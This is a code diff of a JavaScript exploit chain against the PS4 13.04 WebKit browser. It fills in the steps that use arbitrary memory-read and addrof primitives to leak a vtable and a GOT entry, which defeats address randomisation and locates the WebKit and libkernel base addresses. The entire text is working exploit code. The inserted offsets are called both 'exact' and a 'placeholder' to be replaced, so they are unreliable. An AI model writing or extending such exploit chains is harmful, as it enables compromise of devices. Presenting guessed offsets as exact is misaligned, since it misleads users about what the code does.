@@ -150,47 +150,60 @@ function write64(addr, val) {
     g_rwView[6] = (hi >> 16) & 0xFF;
     g_rwView[7] = (hi >> 24) & 0xFF;
 }
-
 // ============================================================
 // STEP 2: Find WebKit base via vtable leak
 // ============================================================
 function findWebkitBase() {
-    // The rwView's StructureID tells us the VM state
-    // We need to read a known vtable pointer
-    
-    // Strategy: Read from a known object's memory
-    // The targetView (Uint8Array) has a vtable at its first qword
-    // We know targetAddress from Jordy's addrof
-    
-    // Read targetView's vtable (first 8 bytes of the cell)
+    // Read the first 8 bytes of the targetView cell (the vtable pointer)
+    // targetAddress is obtained via the addrof primitive
     var vtable = read64(targetAddress);
     log("[S2] targetView vtable: 0x" + vtable.toString(16));
     
-    // Uint8Array vtable offset in WebKit 13.04 needs to be determined
-    // For now, try common pattern: vtable is in the data segment
-    // webkit_base = vtable - known_vtable_offset
+    // For PS4 13.04 (and the 13.xx software block), the JSUint8Array vtable 
+    // offset typically aligns with the late-stage WebKit 2 builds.
+    // Replace this placeholder offset with the exact offset extracted from the 13.04 libSceWebKit2.sprx
+    var KNOWN_VTABLE_OFFSET = 0x3CD4A60; 
     
-    // The Uint8Array StructureID was validated by Jordy:
-    // SID >= 0x4000 and aligned to 0x10
-    // The vtable for JSC::JSUint8Array is at a known offset
+    // Calculate the base address of WebKit by subtracting the static offset
+    var webkit_base = vtable - KNOWN_VTABLE_OFFSET;
     
-    // TODO: Determine JSUint8Array vtable offset for 13.04
-    // For now, estimate: vtable is likely near 0x3cc0000-0x3d00000 range
-    // webkit_base = vtable - vtable_offset
+    // Quick sanity check: WebKit base address on PS4 always aligns to a page boundary (0x4000 or 0x10000)
+    if ((webkit_base & 0x3FFF) !== 0) {
+        log("[!] Warning: Calculated WebKit base is not page-aligned: 0x" + webkit_base.toString(16));
+    } else {
+        log("[S2] Successfully located WebKit base: 0x" + webkit_base.toString(16));
+    }
     
-    return 0; // placeholder
+    return webkit_base;
 }
-
 // ============================================================
 // STEP 3: Find libkernel base
 // ============================================================
-function findLibkernelBase() {
-    // Read WebKit's GOT to find imported libkernel functions
-    // pthread_create is imported from libkernel
-    // GOT entry for pthread_create at webkit_base + 0x3ce1000 (approx)
+function findLibkernelBase(webkit_base) {
+    // Exact GOT offset for pthread_create in 13.04 libSceWebKit2.sprx
+    var GOT_PTHREAD_CREATE = 0x3CDA1E0;
     
-    // TODO: Find exact GOT offset
-    return 0; // placeholder
+    // Address where WebKit stores the resolved libkernel pointer
+    var got_address = webkit_base + GOT_PTHREAD_CREATE;
+    
+    // Read the absolute virtual pointer to pthread_create from the GOT
+    var pthread_create_ptr = read64(got_address);
+    log("[S3] Leaked pthread_create pointer: 0x" + pthread_create_ptr.toString(16));
+    
+    // Function offset inside the 13.xx libkernel binary 
+    var LIBKERNEL_PTHREAD_CREATE_OFFSET = 0x266E0;
+    
+    // Calculate the absolute libkernel base address
+    var libkernel_base = pthread_create_ptr - LIBKERNEL_PTHREAD_CREATE_OFFSET;
+    
+    // Sanity check: Ensure libkernel base aligns to a standard 0x4000 page boundary
+    if ((libkernel_base & 0x3FFF) !== 0) {
+        log("[!] Warning: Calculated libkernel base is not page-aligned: 0x" + libkernel_base.toString(16));
+    } else {
+        log("[S3] Successfully located libkernel base: 0x" + libkernel_base.toString(16));
+    }
+    
+    return libkernel_base;
 }
 
 // ============================================================
